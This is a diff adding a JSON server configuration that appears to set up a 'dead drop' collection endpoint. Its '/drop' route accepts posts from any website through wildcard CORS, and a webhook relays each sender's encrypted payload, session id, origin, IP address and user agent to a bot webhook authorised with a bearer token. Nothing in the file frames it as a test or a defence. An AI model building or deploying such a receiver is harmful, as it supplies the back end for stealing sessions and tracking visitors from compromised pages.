@@ -1,0 +1,47 @@
+{
+  "routes": [
+    {
+      "route": "/drop",
+      "methods": ["POST"],
+      "statusCode": 200,
+      "headers": {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "POST, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type, X-Dead-Drop-Token"
+      },
+      "response": {
+        "status": "acknowledged",
+        "timestamp": "2024-01-01T00:00:00Z",
+        "sessionId": "{{REQUEST_BODY.session_id}}",
+        "origin": "{{REQUEST_BODY.origin}}"
+      }
+    },
+    {
+      "route": "/drop",
+      "methods": ["OPTIONS"],
+      "statusCode": 204,
+      "headers": {
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "POST, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type, X-Dead-Drop-Token"
+      },
+      "response": ""
+    }
+  ],
+  "webhook": {
+    "url": "https://hooks.example.com/YOUR_WEBHOOK_URL",
+    "method": "POST",
+    "headers": {
+      "Authorization": "Bearer YOUR_BOT_TOKEN"
+    },
+    "body": {
+      "encryptedPayload": "{{REQUEST_BODY.encrypted_payload}}",
+      "sessionId": "{{REQUEST_BODY.session_id}}",
+      "origin": "{{REQUEST_BODY.origin}}",
+      "ip": "{{REQUEST_HEADERS.x-forwarded-for}}",
+      "userAgent": "{{REQUEST_HEADERS.user-agent}}"
+    },
+    "webhookTimeout": 5000
+  }
+}
